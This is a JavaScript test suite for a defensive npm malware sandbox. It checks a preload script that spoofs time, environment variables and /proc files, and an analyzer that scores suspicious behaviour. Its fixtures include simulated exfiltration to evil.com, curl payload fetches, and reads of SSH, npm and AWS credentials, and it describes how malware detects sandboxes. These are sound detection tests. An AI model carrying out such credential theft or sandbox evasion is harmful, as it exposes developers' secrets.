const fs = require('fs');
const path = require('path');
const os = require('os');
const vm = require('vm');
const {
  test, asyncTest, assert, assertIncludes, assertNotIncludes,
  addSkipped
} = require('../test-utils');

function runPreloadTests() {
  console.log('\n=== PRELOAD UNIT TESTS ===\n');

  // ============================================
  // ANALYZER TESTS
  // ============================================

  const { analyzePreloadLog } = require('../../src/sandbox/analyzer.js');

  test('PRELOAD-ANALYZER: empty input returns score 0', () => {
    const result = analyzePreloadLog('');
    assert(result.score === 0, 'Empty log should score 0, got ' + result.score);
    assert(result.findings.length === 0, 'Should have no findings');
  });

  test('PRELOAD-ANALYZER: null input returns score 0', () => {
    const result = analyzePreloadLog(null);
    assert(result.score === 0, 'Null should score 0');
  });

  test('PRELOAD-ANALYZER: undefined input returns score 0', () => {
    const result = analyzePreloadLog(undefined);
    assert(result.score === 0, 'Undefined should score 0');
  });

  test('PRELOAD-ANALYZER: timer delay > 15min scores MEDIUM', () => {
    const log = '[PRELOAD] TIMER: setTimeout delay=7200000ms (2.0h) forced to 0 (t+100ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 15, 'Timer > 15min should score 15, got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding');
    assert(result.findings[0].type === 'sandbox_timer_delay_suspicious', 'Type should be sandbox_timer_delay_suspicious');
    assert(result.findings[0].severity === 'MEDIUM', 'Severity should be MEDIUM');
  });

  test('PRELOAD-ANALYZER: timer delay > 24h scores CRITICAL and supersedes suspicious', () => {
    const log = '[PRELOAD] TIMER: setTimeout delay=259200000ms (72.0h) forced to 0 (t+100ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 30, 'Timer > 24h should score 30, got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding (critical only)');
    assert(result.findings[0].type === 'sandbox_timer_delay_critical', 'Type should be sandbox_timer_delay_critical');
    assert(result.findings[0].severity === 'CRITICAL', 'Severity should be CRITICAL');
  });

  test('PRELOAD-ANALYZER: both >15min and >24h timers — critical supersedes suspicious', () => {
    const log =
      '[PRELOAD] TIMER: setTimeout delay=7200000ms (2.0h) forced to 0 (t+100ms)\n' +
      '[PRELOAD] TIMER: setTimeout delay=259200000ms (72.0h) forced to 0 (t+200ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 30, 'Should only score 30 (critical only), got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding (critical supersedes suspicious)');
    assert(result.findings[0].type === 'sandbox_timer_delay_critical', 'Should be critical type');
  });

  test('PRELOAD-ANALYZER: timer delay < 1h not scored', () => {
    const log = '[PRELOAD] TIMER: setTimeout delay=500ms (0.0h) forced to 0 (t+50ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 0, 'Timer < 1h should score 0, got ' + result.score);
  });

  test('PRELOAD-ANALYZER: sensitive file read scores HIGH', () => {
    const log = '[PRELOAD] FS_READ: SENSITIVE /home/user/.npmrc (t+100ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 20, 'Sensitive read should score 20, got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding');
    assert(result.findings[0].type === 'sandbox_preload_sensitive_read', 'Type should be sandbox_preload_sensitive_read');
    assert(result.findings[0].severity === 'HIGH', 'Severity should be HIGH');
  });

  test('PRELOAD-ANALYZER: non-sensitive file read not scored', () => {
    const log = '[PRELOAD] FS_READ: /usr/lib/node_modules/npm/package.json (t+50ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 0, 'Non-sensitive read should score 0');
  });

  test('PRELOAD-ANALYZER: network after sensitive read scores CRITICAL', () => {
    const log =
      '[PRELOAD] FS_READ: SENSITIVE /home/user/.npmrc (t+100ms)\n' +
      '[PRELOAD] NETWORK: https.request POST evil.com/steal (t+200ms)\n';
    const result = analyzePreloadLog(log);
    // Should have: sensitive read (20) + network after sensitive read (40) = 60
    assert(result.score === 60, 'Sensitive read + network should score 60, got ' + result.score);
    const types = result.findings.map(f => f.type);
    assert(types.includes('sandbox_preload_sensitive_read'), 'Should have sensitive read finding');
    assert(types.includes('sandbox_network_after_sensitive_read'), 'Should have network after read finding');
  });

  test('PRELOAD-ANALYZER: network WITHOUT sensitive read does not trigger compound', () => {
    const log = '[PRELOAD] NETWORK: https.request GET npmjs.org/pkg (t+100ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 0, 'Network alone should score 0');
    assert(result.findings.length === 0, 'No findings for network alone');
  });

  test('PRELOAD-ANALYZER: dangerous exec scores HIGH', () => {
    const log = '[PRELOAD] EXEC: DANGEROUS execSync: curl http://evil.com/payload (t+100ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 25, 'Dangerous exec should score 25, got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding');
    assert(result.findings[0].type === 'sandbox_exec_suspicious', 'Type should be sandbox_exec_suspicious');
    assert(result.findings[0].severity === 'HIGH', 'Severity should be HIGH');
  });

  test('PRELOAD-ANALYZER: non-dangerous exec not scored', () => {
    const log = '[PRELOAD] EXEC: exec: node index.js (t+100ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 0, 'Non-dangerous exec should score 0');
  });

  test('PRELOAD-ANALYZER: env token access scores MEDIUM', () => {
    const log =
      '[PRELOAD] ENV_ACCESS: GITHUB_TOKEN (t+100ms)\n' +
      '[PRELOAD] ENV_ACCESS: NPM_TOKEN (t+200ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 10, 'Env access should score 10, got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding');
    assert(result.findings[0].type === 'sandbox_env_token_access', 'Type should be sandbox_env_token_access');
    assert(result.findings[0].severity === 'MEDIUM', 'Severity should be MEDIUM');
    assertIncludes(result.findings[0].detail, 'GITHUB_TOKEN', 'Should mention GITHUB_TOKEN');
    assertIncludes(result.findings[0].detail, 'NPM_TOKEN', 'Should mention NPM_TOKEN');
  });

  test('PRELOAD-ANALYZER: combined findings cap at 100', () => {
    const log =
      '[PRELOAD] TIMER: setTimeout delay=259200000ms (72.0h) forced to 0 (t+10ms)\n' +
      '[PRELOAD] FS_READ: SENSITIVE /home/user/.npmrc (t+20ms)\n' +
      '[PRELOAD] NETWORK: https.request POST evil.com/steal (t+30ms)\n' +
      '[PRELOAD] EXEC: DANGEROUS execSync: curl http://evil.com (t+40ms)\n' +
      '[PRELOAD] ENV_ACCESS: AWS_SECRET_ACCESS_KEY (t+50ms)\n';
    const result = analyzePreloadLog(log);
    // timer(30) + sensitive_read(20) + network_after_read(40) + exec(25) + env(10) = 125 -> capped at 100
    assert(result.score === 100, 'Combined score should cap at 100, got ' + result.score);
  });

  test('PRELOAD-ANALYZER: full time-bomb scenario', () => {
    const log =
      '[PRELOAD] INIT: Preload active. TIME_OFFSET=259200000ms (72.0h). PID=1 (t+0ms)\n' +
      '[PRELOAD] TIME: Time offset applied: +259200000ms (72.0h) (t+0ms)\n' +
      '[PRELOAD] TIMER: setTimeout delay=259200000ms (72.0h) forced to 0 (t+50ms)\n' +
      '[PRELOAD] FS_READ: SENSITIVE /home/sandboxuser/.npmrc (t+100ms)\n' +
      '[PRELOAD] ENV_ACCESS: NPM_TOKEN (t+150ms)\n' +
      '[PRELOAD] NETWORK: https.request POST evil.com/exfil (t+200ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score >= 80, 'Time-bomb scenario should score >= 80, got ' + result.score);
    const types = result.findings.map(f => f.type);
    assert(types.includes('sandbox_timer_delay_critical'), 'Should detect critical timer');
    assert(types.includes('sandbox_preload_sensitive_read'), 'Should detect sensitive read');
    assert(types.includes('sandbox_network_after_sensitive_read'), 'Should detect network after read');
    assert(types.includes('sandbox_env_token_access'), 'Should detect env access');
  });

  test('PRELOAD-ANALYZER: ignores non-PRELOAD lines', () => {
    const log =
      'Some random npm output\n' +
      'npm WARN deprecated\n' +
      '[SANDBOX] Installing pkg...\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 0, 'Non-PRELOAD lines should score 0');
  });

  test('PRELOAD-ANALYZER: multiple sensitive file reads counted once', () => {
    const log =
      '[PRELOAD] FS_READ: SENSITIVE /home/user/.npmrc (t+100ms)\n' +
      '[PRELOAD] FS_READ: SENSITIVE /home/user/.ssh/id_rsa (t+200ms)\n' +
      '[PRELOAD] FS_READ: SENSITIVE /home/user/.aws/credentials (t+300ms)\n';
    const result = analyzePreloadLog(log);
    // Only one sensitive_read finding, score 20
    assert(result.score === 20, 'Multiple sensitive reads should score 20 (once), got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding for all reads');
    assertIncludes(result.findings[0].evidence, '.npmrc', 'Should list .npmrc');
    assertIncludes(result.findings[0].evidence, '.ssh', 'Should list .ssh');
  });

  // ============================================
  // PRELOAD SCRIPT TESTS (vm isolation)
  // ============================================

  console.log('\n=== PRELOAD SCRIPT TESTS (behavioral, subprocess) ===\n');

  // Behavioral harness (was source-grep): preload.js is a sandbox IIFE with no exports that
  // monkey-patches globals on load, so we can't require it in-process. Instead we inject it
  // via `node --require` into a CHILD process and observe the OBSERVABLE effects — faked
  // clock, accelerated timers, hidden env, and the forensic log. Cross-platform: preload's
  // hardcoded LOG_FILE '/tmp/preload.log' resolves to <drive>:/tmp/preload.log on Windows.
  const PRELOAD_PATH = path.join(__dirname, '..', '..', 'docker', 'preload.js');
  const PRELOAD_LOG = path.resolve('/tmp/preload.log');
  const { execFileSync } = require('child_process');

  function runWithPreload(scriptBody, extraEnv = {}) {
    try { fs.rmSync(PRELOAD_LOG, { force: true }); } catch { /* ignore */ }
    let stdout = '';
    try {
      stdout = execFileSync(process.execPath, ['--require', PRELOAD_PATH, '-e', scriptBody], {
        encoding: 'utf8',
        env: { ...process.env, ...extraEnv },
        stdio: ['ignore', 'pipe', 'pipe'],
        timeout: 15000
      });
    } catch (e) {
      stdout = (e.stdout || '') + (e.stderr || '');
    }
    let log = '';
    try { log = fs.readFileSync(PRELOAD_LOG, 'utf8'); } catch { /* no log written */ }
    return { stdout, log };
  }

  test('PRELOAD: preload.js exists and is syntactically valid JS', () => {
    assert(fs.existsSync(PRELOAD_PATH), 'docker/preload.js should exist');
    new vm.Script(fs.readFileSync(PRELOAD_PATH, 'utf8')); // throws on syntax error
  });

  test('PRELOAD: loads in a child process and offsets Date.now by NODE_TIMING_OFFSET', () => {
    const { stdout } = runWithPreload('process.stdout.write(String(Date.now()))',
      { NODE_TIMING_OFFSET: '3600000' });
    const faked = parseInt(stdout.trim(), 10);
    assert(Number.isFinite(faked), `preload should load and print a faked Date.now, got "${stdout.slice(0, 120)}"`);
    const delta = faked - Date.now();
    assert(delta > 3_000_000 && delta < 4_200_000,
      `Date.now should be offset ~+3600000ms (proves the wrapper uses the saved original clock + offset), got delta ${delta}ms`);
  });

  test('PRELOAD: accelerates long timers (a multi-hour setTimeout fires near-immediately)', () => {
    const { stdout } = runWithPreload(
      "const t0=Date.now(); setTimeout(()=>process.stdout.write('FIRED'), 7200000);",
      { NODE_TIMING_OFFSET: '3600000' });
    assert(stdout.includes('FIRED'),
      `a 2h setTimeout should fire (delay forced toward 0), stdout="${stdout.slice(0, 200)}"`);
  });

  test('PRELOAD: patched global timers are non-writable (malware cannot restore them)', () => {
    const { stdout } = runWithPreload(
      "try{global.setTimeout=1}catch(e){} try{global.setInterval=1}catch(e){} " +
      "process.stdout.write('st='+(typeof global.setTimeout)+',si='+(typeof global.setInterval))");
    assert(stdout.includes('st=function') && stdout.includes('si=function'),
      `setTimeout/setInterval must stay functions after a reassignment attempt, got "${stdout}"`);
  });

  test('PRELOAD: hides sandbox-revealing env vars (LD_PRELOAD) via the real get/has/ownKeys env Proxy traps', () => {
    // Exercises the REAL process.env Proxy installed by preload.js (section 9): not just the
    // `get` trap (=== undefined) but also `has` ('LD_PRELOAD' in process.env) and `ownKeys`
    // (Object.keys(process.env)). Malware probes all three to fingerprint the sandbox; a leak
    // via any one of them defeats the hiding. This is the longzy anti-evasion contract.
    const { stdout } = runWithPreload(
      "const g=process.env.LD_PRELOAD===undefined?'hidden':'LEAKED';" +
      "const h=('LD_PRELOAD' in process.env)?'LEAKED':'hidden';" +
      "const k=Object.keys(process.env).includes('LD_PRELOAD')?'LEAKED':'hidden';" +
      "process.stdout.write('get='+g+',has='+h+',keys='+k)",
      { LD_PRELOAD: '/x/evil.so' });
    assert(stdout.includes('get=hidden'), `LD_PRELOAD should be hidden via the get trap, got "${stdout}"`);
    assert(stdout.includes('has=hidden'), `LD_PRELOAD should be hidden via the has trap ('in' operator), got "${stdout}"`);
    assert(stdout.includes('keys=hidden'), `LD_PRELOAD should be hidden via the ownKeys trap (Object.keys), got "${stdout}"`);
  });

  test('PRELOAD: logs sensitive file reads to the forensic log with the [PRELOAD] prefix', () => {
    const { log } = runWithPreload("try{require('fs').readFileSync('/home/user/.ssh/id_rsa')}catch(e){}");
    assert(log.includes('[PRELOAD]'), 'forensic log should use the [PRELOAD] prefix + appendFileSync');
    assert(/FS_READ: SENSITIVE.*id_rsa/.test(log),
      `a read of .ssh/id_rsa should be logged as SENSITIVE, log head="${log.slice(0, 300)}"`);
  });

  test('PRELOAD: intercepts child_process and flags dangerous commands', () => {
    // `curl --version` matches the dangerous-command regex but makes NO network call.
    const { log } = runWithPreload("try{require('child_process').execSync('curl --version')}catch(e){}");
    assert(/EXEC: DANGEROUS.*curl/.test(log),
      `a curl exec should be intercepted and flagged DANGEROUS, log head="${log.slice(0, 300)}"`);
  });

  test('PRELOAD: forensic log is injection-safe (newlines in attacker-controlled paths are escaped)', () => {
    // A malicious path embeds a newline + a forged "[PRELOAD] FAKE" entry. The log sanitizer
    // must escape the newline so the attacker cannot inject a standalone forged log line.
    const { log } = runWithPreload(
      "try{require('fs').readFileSync('/home/user/.ssh/\\n[PRELOAD] FAKE: pwned\\nid_rsa')}catch(e){}");
    assert(log.includes('FAKE: pwned'), 'the crafted path should still be captured in the log (escaped)');
    assert(!/^\[PRELOAD\] FAKE: pwned/m.test(log),
      'the embedded newline must be escaped — no forged standalone [PRELOAD] log line may appear');
  });

  test('PRELOAD: spoofs /proc/1/cgroup to hide Docker (systemd init.scope, no "docker"/"containerd")', () => {
    // Malware reads /proc/1/cgroup to detect a container. preload intercepts the read (a pure
    // path-string match, so it fires on any OS) and returns realistic non-Docker cgroup content.
    const { stdout, log } = runWithPreload(
      "process.stdout.write(require('fs').readFileSync('/proc/1/cgroup','utf8'))");
    assert(stdout.includes('init.scope'),
      `/proc/1/cgroup should be spoofed to systemd init.scope, got "${stdout.slice(0, 120)}"`);
    assert(!/docker|containerd/i.test(stdout),
      `spoofed cgroup must NOT reveal docker/containerd, got "${stdout.slice(0, 120)}"`);
    assert(/SPOOFED \/proc\/1\/cgroup/.test(log), 'the cgroup spoof should be recorded in the forensic log');
  });

  test('PRELOAD: spoofs /proc/uptime to a realistic high uptime (fresh-sandbox detection evasion)', () => {
    const { stdout, log } = runWithPreload(
      "process.stdout.write(require('fs').readFileSync('/proc/uptime','utf8'))");
    const seconds = parseFloat(String(stdout).trim().split(/\s+/)[0]);
    assert(Number.isFinite(seconds) && seconds > 86400,
      `uptime should be spoofed to > 1 day (not a fresh sandbox), got "${stdout.slice(0, 80)}"`);
    assert(/SPOOFED \/proc\/uptime/.test(log), 'the uptime spoof should be recorded in the forensic log');
  });

  test('PRELOAD: intercepts process.dlopen and flags native-addon loads (NATIVE_ADDON)', () => {
    // Native .node addons bypass JS monkey-patches; preload can't block them but logs the load.
    // The log is written before the (failing) real dlopen, so even a bogus path is still flagged.
    const { log } = runWithPreload(
      "try{process.dlopen({exports:{}}, '/tmp/muaddib-nonexistent.node')}catch(e){}");
    assert(/NATIVE_ADDON.*dlopen/.test(log),
      `a process.dlopen call should be flagged NATIVE_ADDON, log head="${log.slice(0, 300)}"`);
  });

  test('PRELOAD: wraps worker_threads.Worker and logs spawns (WORKER) to propagate the sandbox', () => {
    // Workers don't inherit NODE_OPTIONS, so preload wraps the Worker constructor to re-inject
    // itself + the time offset, logging each spawn. We assert the spawn is logged (written
    // synchronously at construction, before the worker thread runs).
    const { log } = runWithPreload(
      "const {Worker}=require('worker_threads'); const w=new Worker('0',{eval:true}); w.on('error',()=>{}); w.on('exit',()=>{});");
    assert(/WORKER.*spawned/.test(log),
      `spawning a Worker should be logged as WORKER, log head="${log.slice(0, 300)}"`);
  });

  // ============================================
  // SANDBOX MODULE INTEGRATION TESTS
  // ============================================

  console.log('\n=== SANDBOX MODULE TESTS ===\n');

  const { analyzePreloadLog: sboxAnalyze, TIME_OFFSETS } = require('../../src/sandbox/index.js');

  test('PRELOAD-MODULE: analyzePreloadLog is re-exported from sandbox/index.js', () => {
    assert(typeof sboxAnalyze === 'function', 'Should be a function');
  });

  test('PRELOAD-MODULE: TIME_OFFSETS has 3 entries', () => {
    assert(Array.isArray(TIME_OFFSETS), 'TIME_OFFSETS should be an array');
    assert(TIME_OFFSETS.length === 3, 'Should have 3 time offsets, got ' + TIME_OFFSETS.length);
    assert(TIME_OFFSETS[0].offset === 0, 'First offset should be 0');
    assert(TIME_OFFSETS[1].offset === 259200000, 'Second offset should be 72h');
    assert(TIME_OFFSETS[2].offset === 604800000, 'Third offset should be 7d');
  });

  test('PRELOAD-MODULE: TIME_OFFSETS have labels', () => {
    for (const entry of TIME_OFFSETS) {
      assert(typeof entry.label === 'string' && entry.label.length > 0, 'Each offset should have a label');
    }
  });

  // ============================================
  // RULES AND PLAYBOOKS
  // ============================================

  console.log('\n=== PRELOAD RULES & PLAYBOOKS ===\n');

  const { getRule } = require('../../src/rules/index.js');
  const { getPlaybook } = require('../../src/response/playbooks.js');

  const preloadRuleTypes = [
    'sandbox_timer_delay_suspicious',
    'sandbox_timer_delay_critical',
    'sandbox_preload_sensitive_read',
    'sandbox_network_after_sensitive_read',
    'sandbox_exec_suspicious',
    'sandbox_env_token_access'
  ];

  for (const type of preloadRuleTypes) {
    test(`PRELOAD-RULE: Rule exists for ${type}`, () => {
      const rule = getRule(type);
      assert(rule.id.startsWith('MUADDIB-SANDBOX-'), `Rule ${type} should have MUADDIB-SANDBOX- ID, got ${rule.id}`);
      assert(typeof rule.severity === 'string', 'Should have severity');
      assert(typeof rule.mitre === 'string', 'Should have MITRE mapping');
    });

    test(`PRELOAD-PLAYBOOK: Playbook exists for ${type}`, () => {
      const playbook = getPlaybook(type);
      assert(playbook !== 'Analyser manuellement cette menace.', `Playbook for ${type} should not be default`);
      assert(playbook.length > 20, 'Playbook should have meaningful content');
    });
  }

  // ============================================
  // LIBFAKETIME ENV HIDING TESTS (v2.10.7)
  // ============================================

  console.log('\n=== PRELOAD LIBFAKETIME TESTS ===\n');

  // The full HIDDEN_ENV_VARS set from docker/preload.js (section 1). Kept in one place so the
  // behavioral tests below cover EVERY var the real preload strips — not a stale subset. If
  // preload.js adds a hidden var, add it here and the child-process test will exercise it.
  const REAL_HIDDEN_ENV_VARS = [
    'LD_PRELOAD', 'FAKETIME', 'DONT_FAKE_MONOTONIC', 'FAKETIME_NO_CACHE',
    'MUADDIB_FAKETIME', 'MUADDIB_FAKETIME_ACTIVE',
    'SSL_CERT_FILE', 'NODE_EXTRA_CA_CERTS', 'MUADDIB_UPSTREAM_DNS'
  ];

  test('PRELOAD-FAKETIME: every HIDDEN_ENV_VARS entry is invisible in the child (real deletion + Proxy)', () => {
    // Set each hidden var in the child env, then read them all from inside the process where
    // preload.js is active. Every one must come back undefined — proving the real preload both
    // deletes them AND masks them via the process.env Proxy. This is what stops longzy-style
    // malware from reading process.env.LD_PRELOAD / process.env.MUADDIB_FAKETIME to detect us.
    const childEnv = {};
    for (const v of REAL_HIDDEN_ENV_VARS) childEnv[v] = 'SENTINEL_' + v;
    const child =
      'const vars=' + JSON.stringify(REAL_HIDDEN_ENV_VARS) + ';' +
      "const leaked=vars.filter(v=>process.env[v]!==undefined);" +
      "process.stdout.write('leaked='+JSON.stringify(leaked))";
    const { stdout } = runWithPreload(child, childEnv);
    assert(/leaked=\[\]/.test(stdout),
      `no hidden sandbox var may be readable from process.env, got "${stdout.slice(0, 300)}"`);
    // Negative control: a NON-hidden var passed the same way must still be visible (proves the
    // test actually plumbs env into the child and isn't trivially green).
    const { stdout: ctrl } = runWithPreload(
      "process.stdout.write('marker='+(process.env.MUADDIB_NOT_HIDDEN||'MISSING'))",
      { MUADDIB_NOT_HIDDEN: 'visible' });
    assert(ctrl.includes('marker=visible'), `a non-hidden env var must remain visible, got "${ctrl}"`);
  });

  test('PRELOAD-FAKETIME: MUADDIB_FAKETIME_ACTIVE=1 forces TIME_OFFSET to 0 (no JS-level double acceleration)', () => {
    // libfaketime already shifts the clock at the C level; when MUADDIB_FAKETIME_ACTIVE=1 the
    // preload MUST set its own TIME_OFFSET to 0 so Date.now() is NOT shifted a second time.
    // We observe the real effect: Date.now() stays ~ the real wall clock despite a 72h
    // NODE_TIMING_OFFSET that would otherwise push it +72h (compare with the l.220 test which
    // proves the offset IS applied when FAKETIME_ACTIVE is absent).
    const { stdout } = runWithPreload('process.stdout.write(String(Date.now()))',
      { MUADDIB_FAKETIME_ACTIVE: '1', NODE_TIMING_OFFSET: '259200000' });
    const reported = parseInt(stdout.trim(), 10);
    assert(Number.isFinite(reported), `should print a Date.now, got "${stdout.slice(0, 120)}"`);
    const delta = reported - Date.now();
    assert(Math.abs(delta) < 60_000,
      `Date.now must stay ~real (offset forced to 0) when FAKETIME_ACTIVE, got delta ${delta}ms (a ~+259200000ms delta means double-acceleration)`);
  });

  test('PRELOAD-FAKETIME: /proc/self/environ read strips hidden sandbox vars (real fs spoof hook)', () => {
    // Linux-only: /proc/self/environ is the kernel snapshot of the exec-time env, so it still
    // holds LD_PRELOAD even after preload deletes it from process.env. preload.js section 11d
    // intercepts this read and filters HIDDEN_ENV_VARS. This is the exact vector longzy used
    // (read /proc/self/environ to spot libfaketime). Skip off-Linux — no procfs.
    if (process.platform !== 'linux') {
      addSkipped(1, 'PRELOAD /proc/self/environ: Linux-only (needs procfs)');
      return;
    }
    const { stdout } = runWithPreload(
      "process.stdout.write(require('fs').readFileSync('/proc/self/environ','utf8'))",
      { LD_PRELOAD: '/usr/lib/faketime/libfaketime.so.1', FAKETIME: '+3d x1000', MUADDIB_FAKETIME: '1' });
    assert(!stdout.includes('LD_PRELOAD'), 'LD_PRELOAD must be stripped from /proc/self/environ');
    assert(!stdout.includes('libfaketime'), 'the libfaketime .so path must not leak via /proc/self/environ');
    assert(!stdout.includes('FAKETIME=+3d'), 'FAKETIME value must be stripped from /proc/self/environ');
    // Negative control: a non-hidden var (PATH always present on Linux) must survive the filter,
    // proving the spoof returns the real (filtered) environ, not an empty buffer.
    assert(stdout.includes('PATH'), 'non-hidden vars (PATH) must be preserved in the spoofed environ');
  });
}

module.exports = { runPreloadTests };
